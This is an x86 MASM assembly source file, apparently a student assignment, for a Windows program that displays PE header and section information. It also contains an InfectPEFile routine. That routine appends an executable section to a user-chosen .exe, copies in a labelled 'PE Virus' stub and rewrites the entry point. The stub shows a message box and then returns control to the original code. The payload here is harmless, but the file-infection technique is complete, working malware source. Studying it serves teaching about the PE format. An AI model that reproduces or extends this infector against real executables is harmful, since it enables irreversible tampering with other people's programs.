.386
.model flat,stdcall
option casemap:none		;开关选项，汇编模式

include windows.inc
include gdi32.inc
includelib gdi32.lib
include user32.inc
includelib user32.lib
include kernel32.inc
includelib kernel32.lib
include comdlg32.inc
includelib comdlg32.lib		;include file和静态库


IDR_MENU	equ	1001	;全局变量
ID_QUERY_FILE	equ	1101
ID_EXIT		equ	1102
ID_INFECT_FILE	equ	1201
ID_HELP		equ	1301
IDC_EDIT	equ	40001

;函数原型定义，函数名，参数名，参数类型
OpenFileDlg	proto 	hInst:HINSTANCE,hWnd:HWND,lpFileName:dword,lpFilterString:dword,lpTitle:dword
GetPEHeaderInfo	proto	lpFileName:dword,hEdit:HWND
InfectPEFile	proto

;数据段：变量和常量
.data
		hInstance	dd	?
		hMainWnd	dd	?
		hEdit		HWND	?    ;句柄
		szFileName	db	MAX_PATH dup (0)

.const
		;****************************
		;_WinMain中使用的全局字符串变量（实在是因为初始化局部字串变量不容易啊）
		;****************************
		szAppName	db 	'PEFILE',0
		szCaption	db	'PE File Operation',0

		;****************************
		;_MainWndProc中使用的全局字符串变量
		;****************************
		szEditCtrl	db	"EDIT",0
		szFilterString	db	"Portable Executive File(*.exe)",0,"*.exe",0,"All files(*.*)",0,"*.*",0,0
		szTitle		db	"please open a Portable Executive File!",0
		szConfirmation	db	"Are you sure to infect that chosen file, the procedure isnot reversible!PB13011066 肖宁",0
		szWarning	db	"Warning!!!!!",0
		szHelp		db	"首先选择文件->QueryFile获取文件信息，然后选择Infect->InfectChosenFile感染上一步选定的文件",0

		;****************************
		;GetPEHeaderInfo中使用的全局字符串变量
		;****************************
		szErrorOpenFile	db	"Cannot open chosen file!",0
		szErrorFileType	db	"This file isn't a PE file!",0
		szBasicInfoFormat	db	0dh,0ah,0dh,0ah
					db	'NumberOfSections : %d',0dh,0ah
					db	'ImageBase : 	%08X',0dh,0ah
					db	'AddressOfEntryPoint : %08X',0dh,0ah
					db	'SizeOfImage %08X',0dh,0ah,0dh,0ah
		szSectionInfoString	db	'节区名称		节区大小		RVA地址		对齐后大小	文件偏移		属性',0dh,0ah,0
		szSectionInfoFormat	db	'%s		%08X	%08X	%08X	%08X	%08X',0dh,0ah,0dh,0ah,0
		StuInfo		        db      'PB13011066 XiaoNing',0
                BoxTitle    		db      'Student Information',0
		;****************************
		;InfectPEFile中使用的全局字符串变量
		;****************************
		szDllName	db	"user32",0
		szMessageBoxA	db	"MessageBoxA",0

;代码段
.code


;**************************************************************
;窗口过程定义
;**************************************************************
_MainWndProc proc uses edi esi ebx,hWnd,uMessage,wParam,lParam  ;wParam(UINT),lParam(LONG)用于传递消息数据
			mov eax,uMessage

			.if eax == WM_CREATE
				invoke CreateWindowEx,0,offset szEditCtrl,NULL,WS_CHILD or WS_VISIBLE or WS_HSCROLL or WS_VSCROLL\
							or WS_BORDER or ES_LEFT or ES_MULTILINE or ES_AUTOHSCROLL or ES_AUTOVSCROLL,\
							0,0,0,0,hWnd,IDC_EDIT,hInstance,0
				mov	hEdit,eax
				invoke MessageBox,NULL,offset StuInfo,offset BoxTitle,MB_YESNO   ;显示学号姓名信息
				invoke SetWindowText,hEdit,addr StuInfo
				invoke	SendMessage,hEdit,EM_SETREADONLY,TRUE,0;将编辑框属性改为只读

			.elseif eax == WM_SIZE
				xor	eax,eax
				mov	ax,word ptr [lParam]
				xor	ecx,ecx
				mov	cx,word ptr [lParam + 2]
				invoke	MoveWindow,hEdit,0,0,eax,ecx,TRUE;要注意这里的EAX,ECX对应的MoveWindow函数的参数都是整型变量，所以代码如此难看

			.elseif	eax == WM_COMMAND
				mov eax,wParam
				.if ax == ID_EXIT
					jmp	_Exit;
				.elseif ax == ID_QUERY_FILE
					invoke OpenFileDlg,hInstance,hWnd,offset szFileName,offset szFilterString,offset szTitle
		_QueryInfo:
					invoke SetWindowText,hEdit,offset szFileName
					invoke GetPEHeaderInfo,offset szFileName,hEdit
				.elseif	ax == ID_INFECT_FILE
					invoke	MessageBox,NULL,offset StuInfo,offset BoxTitle,MB_YESNO
					invoke	MessageBox,NULL,offset szConfirmation,offset szWarning,MB_YESNO
						.if	eax == IDYES
							invoke	InfectPEFile
						.endif
					jmp	_QueryInfo
				.elseif	ax == ID_HELP
					invoke MessageBox,NULL,offset szHelp,offset szWarning,MB_OK
				.endif
			.elseif eax == WM_CLOSE
_Exit:
				invoke DestroyWindow,hMainWnd
				invoke PostQuitMessage,NULL

			.else
				invoke DefWindowProc,hWnd,uMessage,wParam,lParam
				ret
			.endif
			xor eax,eax
			ret
_MainWndProc endp

;***********************************************
;_WinMain函数
;***********************************************
_WinMain proc	
		local @stWndClass : WNDCLASSEX
		local @stMsg      : MSG
		local @hMenu	: HMENU
		invoke GetModuleHandle,NULL    ;获取一个应用程序或动态链接库的模块句柄
		mov hInstance,eax
		invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass

		invoke LoadCursor,0,IDC_ARROW  ;该函数从一个与应用事例相关的可执行文件（EXE文件）中载入指定的光标资源
		mov  @stWndClass.hCursor,eax
		push hInstance
		pop  @stWndClass.hInstance
		mov  @stWndClass.cbSize,sizeof WNDCLASSEX
		mov  @stWndClass.style,CS_HREDRAW or CS_VREDRAW
		mov  @stWndClass.lpfnWndProc,offset _MainWndProc
		mov  @stWndClass.hbrBackground,COLOR_WINDOW + 1
		mov  @stWndClass.lpszClassName,offset szAppName
		invoke RegisterClassEx,addr @stWndClass   ;该函数为随后在调用Createwindow函数和CreatewindowEx函数中使用的窗口注册一个窗口类

		invoke LoadMenu,hInstance,IDR_MENU	  ;从与应用程序实例相联系的可执行文件（．EXE）中加载指定的菜单资源
		mov @hMenu,eax

		invoke CreateWindowEx,WS_EX_CLIENTEDGE,offset szAppName,offset szCaption,WS_OVERLAPPEDWINDOW,\
						100,100,600,400,NULL,@hMenu,hInstance,NULL

		mov hMainWnd,eax
		invoke ShowWindow,hMainWnd,SW_SHOWNORMAL	;设置指定窗口的显示状态
		invoke UpdateWindow,hMainWnd			;更新指定窗口
	        
		.while TRUE
			invoke GetMessage,addr @stMsg,NULL,0,0
			;函数GetMessage 是 从调用线程的消息队列里取得一个消息并将其放于指定的结构。
			;此函数可取得与指定窗口联系的消息和由PostThreadMesssge寄送的线程消息。
			;此函数接收一定范围的消息值。GetMessage不接收属于其他线程或应用程序的消息。
			;获取消息成功后，线程将从消息队列中删除该消息。函数会一直等待直到有消息到来才有返回值。
			.break .if eax == 0
			invoke TranslateMessage,addr @stMsg  ;用于将虚拟键消息转换为字符消息
			invoke DispatchMessage,addr @stMsg
			;该函数分发一个消息给窗口程序。通常消息从GetMessage函数获得。
			;消息被分发到回调函数（过程函数)，作用是消息传递给操作系统，然后操作系统去调用我们的回调函数，也就是说我们在窗体的过程函数中处理消息。
		.endw
		ret
_WinMain endp

;*************************************************************************************************
;打开文件模块(不使用任何全局变量的模块，可直接移植到其他文件中)
;*************************************************************************************************
OpenFileDlg proc hInst:HINSTANCE,hWnd:HWND,lpFileName:dword,lpFilterString:dword,lpTitle:dword
	;hInst代表当前进程的示例句柄
	;hWnd代表当前窗口句柄
	;lpFileName是指向存储要打开文件名的缓冲区的长指针
	;lpFilterString是指向筛选文件类型的缓冲区的长指针
	;lpTitle是指向打开文件通用对话框的名字的长指针

	local	@ofn : OPENFILENAME
	invoke	RtlZeroMemory,addr @ofn,sizeof OPENFILENAME

	mov	@ofn.lStructSize,sizeof OPENFILENAME
	push	hWnd
	pop	@ofn.hwndOwner
	push	hInst
	pop	@ofn.hInstance
	push	lpFilterString
	pop	@ofn.lpstrFilter
	push	lpFileName
	pop	@ofn.lpstrFile
	mov	@ofn.nMaxFile,MAX_PATH
	mov	@ofn.Flags,OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST or OFN_LONGNAMES or OFN_EXPLORER
	push	lpTitle
	pop	@ofn.lpstrTitle
	invoke	GetOpenFileName,addr @ofn
	
	.if eax == 0
		ret;失败返回值是0，即EAX的值
	.endif

	ret
OpenFileDlg	endp

;************************************************************
;读取文件头信息
;************************************************************
GetPEHeaderInfo	proc	lpFileName:dword,hEditCtrl:HWND
	;lpFileName	是指向要打开的文件名的指针
	;hEditCtrl	是控件输出的子控件
	
	local	@hFile:HANDLE
	local	@dwFileReadWritten:dword	;使用读写文件是必需的参数
	local	@szBuffer[200]:byte

	;存储PE文件头基本信息的变量
	local	@ImageNtHeaders : IMAGE_NT_HEADERS
	local	@ImageSectionHeader : IMAGE_SECTION_HEADER

	local	@dwPEHeaderOffset : dword
	local	@dwSectionHeaderOffset : dword
	local	@dwCurrentSectionHeader: dword
	
	invoke	CreateFile,lpFileName,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,\
			FILE_ATTRIBUTE_NORMAL,NULL
	;这是一个多功能的函数，可打开或创建以下对象，并返回可访问的句柄：控制台，通信资源，目录（只读打开），磁盘驱动器，文件，邮槽，管道。
	mov	@hFile,eax
	.if	eax == INVALID_HANDLE_VALUE
		invoke SetWindowText,hEditCtrl,addr szErrorOpenFile
		ret
	.endif
    ;handle distance_to_move out_p_distance_to_move_high dwMoveMethod
	invoke	SetFilePointer,@hFile,3ch,NULL,FILE_BEGIN
    ;handle out_pbuffer num_of_bytes_to_read out_lp_num_of_bytes_read inout_lpoverlapped
	invoke	ReadFile,@hFile,addr @dwPEHeaderOffset,sizeof DWORD,addr @dwFileReadWritten,0
    ; get PE offset

	invoke	SetFilePointer,@hFile,@dwPEHeaderOffset,NULL,FILE_BEGIN
	invoke	ReadFile,@hFile,addr @ImageNtHeaders,sizeof IMAGE_NT_HEADERS,addr @dwFileReadWritten,0
	
	.if	[@ImageNtHeaders.Signature] != IMAGE_NT_SIGNATURE
		invoke SetWindowText,hEditCtrl,addr szErrorFileType
		ret
	.endif

	movzx	eax,[@ImageNtHeaders.FileHeader.NumberOfSections];这个地方让人很困扰啊，因为不扩展WORD为DWORD，始终都有错误
	invoke	wsprintf,addr @szBuffer,offset szBasicInfoFormat,eax,\
				@ImageNtHeaders.OptionalHeader.ImageBase,@ImageNtHeaders.OptionalHeader.AddressOfEntryPoint,\
				@ImageNtHeaders.OptionalHeader.SizeOfImage
	invoke	GetWindowTextLength,hEditCtrl
	invoke	SendMessage,hEditCtrl,EM_SETSEL,eax,eax
	invoke	SendMessage,hEditCtrl,EM_REPLACESEL,0,addr @szBuffer

	;获取节表信息
	xor	ecx,ecx
	mov	eax,@dwPEHeaderOffset
	add	eax,sizeof IMAGE_NT_HEADERS
	mov	@dwSectionHeaderOffset,eax
	mov	@dwCurrentSectionHeader,eax

	.while	cx < [@ImageNtHeaders.FileHeader.NumberOfSections]
		push	ecx;将ECX入栈保护是必需的，因为WINDOWS在调用函数是，会破坏ECX的值
		invoke	SetFilePointer,@hFile,@dwCurrentSectionHeader,NULL,FILE_BEGIN
		invoke	ReadFile,@hFile,addr @ImageSectionHeader,sizeof IMAGE_SECTION_HEADER,addr @dwFileReadWritten,0
		invoke	wsprintf,addr @szBuffer,offset szSectionInfoFormat,addr @ImageSectionHeader.Name1,\
				@ImageSectionHeader.Misc.VirtualSize,@ImageSectionHeader.VirtualAddress,\
				@ImageSectionHeader.SizeOfRawData,@ImageSectionHeader.PointerToRawData,\
				@ImageSectionHeader.Characteristics
		invoke	GetWindowTextLength,hEditCtrl
		invoke	SendMessage,hEditCtrl,EM_SETSEL,eax,eax
		invoke	SendMessage,hEditCtrl,EM_REPLACESEL,0,addr @szBuffer
		pop	ecx
		inc	cx
		add	@dwCurrentSectionHeader,sizeof IMAGE_SECTION_HEADER
	.endw
	
	invoke CloseHandle,@hFile
	ret
GetPEHeaderInfo	endp


;******************************************************************************
;***************************************************************
;InfectPEFile函数
;***************************************************************
;******************************************************************************
InfectPEFile proc
	local	dwPE_Header_Offset
	local	dwMySection_Offset
	local	dwFileReadWritten
	local	dwLast_SizeOfRawData
	local	dwLast_PointerToRawData
	local	hFile
	local	PE_Header:IMAGE_NT_HEADERS
	local	My_Section:IMAGE_SECTION_HEADER

	invoke CreateFile,addr szFileName,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
	.if	eax == INVALID_HANDLE_VALUE
		ret
	.endif
	mov	hFile,eax
	
;************************************************************************************************************
;读取文件头到PE_Header结构中
;************************************************************************************************************
	invoke SetFilePointer,hFile,3ch,NULL,FILE_BEGIN	;在一个文件中设置当前的读取位置
	invoke ReadFile,hFile,addr dwPE_Header_Offset,sizeof DWORD,addr dwFileReadWritten,0
	;从文件指针指向的位置开始将数据读出到一个文件中， 且支持同步和异步操作，如果文件打开方式没有指明FILE_FLAG_OVERLAPPED的话，
	;当程序调用成功时，它将实际读出文件的字节数保存到lpNumberOfBytesRead指明的地址空间中。FILE_FLAG_OVERLAPPED 允许对文件进行重叠操作
	;如果文件要交互使用的话，当函数调用完毕时要记得调整文件指针。从文件中读出数据。与fread函数相比，这个函数要明显灵活的多。
	;该函数能够操作通信设备、管道、套接字以及邮槽。
	invoke SetFilePointer,hFile,dwPE_Header_Offset,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr PE_Header,sizeof IMAGE_NT_HEADERS,addr dwFileReadWritten,0
	
	;检验这个文件是不是一个PE文件，方法很简单，用PE文件签名检验
	.if	PE_Header.Signature != IMAGE_NT_SIGNATURE
		ret
	.endif

	;保存当前的程序入口点RVA和基址
	mov	eax,[PE_Header.OptionalHeader.AddressOfEntryPoint]
	mov	dwOld_AddressOfEntryPoint,eax
	mov	eax,[PE_Header.OptionalHeader.ImageBase]
	mov	dwOld_ImageBase,eax

;************************************************************************************************************
;填写自己的节的头的内容
;************************************************************************************************************
	;找到要添加的新节的头的文件偏移量
	mov	eax,sizeof IMAGE_SECTION_HEADER
	xor	ecx,ecx
	mov	cx,[PE_Header.FileHeader.NumberOfSections]
	mul	ecx
	add	eax,dwPE_Header_Offset
	add	eax,sizeof IMAGE_NT_HEADERS
	mov	dwMySection_Offset,eax
	;验证是否能装下一个新的IMAGE_SECTION_HEADER结构
	.if eax > [PE_Header.OptionalHeader.SizeOfHeaders]
		ret
	.endif
	;正式开始填写新节的头的内容
	mov	dword ptr [My_Section.Name1],"BL"
	mov	[My_Section.Misc.VirtualSize],offset virusEnd - offset virusStart
	mov	eax,[PE_Header.OptionalHeader.SizeOfImage]
	mov	[My_Section.VirtualAddress],eax
	mov	eax,[My_Section.Misc.VirtualSize]
	mov	ecx,[PE_Header.OptionalHeader.FileAlignment]
	cdq
	div	ecx
	inc	eax
	mul	ecx
	mov	[My_Section.SizeOfRawData],eax
	;要定位到前个节区的头信息，为了得到PointerToRawData成员变量
	mov	eax,dwMySection_Offset
	sub	eax,24d;到达前个节区的SizeOfRawData成员变量处
	invoke SetFilePointer,hFile,eax,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr dwLast_SizeOfRawData,4,addr dwFileReadWritten,0
	invoke ReadFile,hFile,addr dwLast_PointerToRawData,4,addr dwFileReadWritten,0
	mov	eax,dwLast_PointerToRawData
	add	eax,dwLast_SizeOfRawData
	mov	[My_Section.PointerToRawData],eax
	mov	[My_Section.PointerToRelocations],0
	mov	[My_Section.PointerToLinenumbers],0
	mov	[My_Section.NumberOfRelocations],0
	mov	[My_Section.NumberOfLinenumbers],0
	mov	[My_Section.Characteristics],0E0000020h;新节的属性是可读可写可执行

	;将新节的头写入要感染的文件中
	invoke SetFilePointer,hFile,dwMySection_Offset,0,FILE_BEGIN
	invoke WriteFile,hFile,addr My_Section,sizeof IMAGE_SECTION_HEADER,addr dwFileReadWritten,0

;************************************************************************************************************
;获取要调用的API的线性地址
;************************************************************************************************************
	invoke LoadLibrary,addr szDllName	;载入指定的动态链接库，并将它映射到当前进程使用的地址空间。一旦载入，即可访问库内保存的资源
	invoke GetProcAddress,eax,addr szMessageBoxA	;检索指定的动态链接库(DLL)中的输出库函数地址
	mov	MessageBoxAddr,eax
	mov	eax,MessageBoxAddr

	
	;将病毒代码添加在节的最后
	invoke SetFilePointer,hFile,0,0,FILE_END
	push	0
	lea	eax,dwFileReadWritten
	push	eax
	push	[My_Section.SizeOfRawData]
	lea	eax,virusStart
	push	eax
	push	hFile
	call	WriteFile

;************************************************************************************************************
;更改程序进入点和EXE映像大小
;************************************************************************************************************
	inc	[PE_Header.FileHeader.NumberOfSections];节的个数增加1
	mov	eax,[My_Section.VirtualAddress]		;入口点改变
	mov	[PE_Header.OptionalHeader.AddressOfEntryPoint],eax

	mov	eax,[My_Section.Misc.VirtualSize]	;程序映像大小改变
	mov	ecx,[PE_Header.OptionalHeader.SectionAlignment]
	cdq
	div	ecx
	inc	eax
	mul	ecx
	add	[PE_Header.OptionalHeader.SizeOfImage],eax

	invoke SetFilePointer,hFile,dwPE_Header_Offset,0,FILE_BEGIN
	invoke WriteFile,hFile,addr PE_Header,sizeof IMAGE_NT_HEADERS,addr dwFileReadWritten,0
	
	invoke CloseHandle,hFile
	xor	eax,eax
	inc	eax;成功感染返回值设为1
	ret
InfectPEFile endp

;************************************************************************************************************
;以下是插入的病毒代码
;************************************************************************************************************
virusStart:
	call nStart
nStart:
	pop	ebp
	sub	ebp,offset nStart

;TODO
	push	MB_YESNO
	lea	eax,szTitleMsg[ebp]
	push	eax
	lea	eax,szContent[ebp]
	push	eax
	push	0
	call 	MessageBoxAddr[ebp]

	.if eax == IDNO
		ret
	.endif

	mov	eax,dwOld_AddressOfEntryPoint[ebp]
	add	eax,dwOld_ImageBase[ebp]
	push	eax
	ret
;变量定义
	dwOld_AddressOfEntryPoint	dd	0
	dwOld_ImageBase			dd	0
	szTitleMsg			db	"PE Virus,Created by BEN",0	
	szContent			db	"Do you want to continue",0
	MessageBoxAddr			dd	0
virusEnd:

;***********************************************************
;主程序开始
;***********************************************************
	start:
		call _WinMain
		invoke ExitProcess,NULL	;指定想中断的那个进程的一个退出代码
	end start
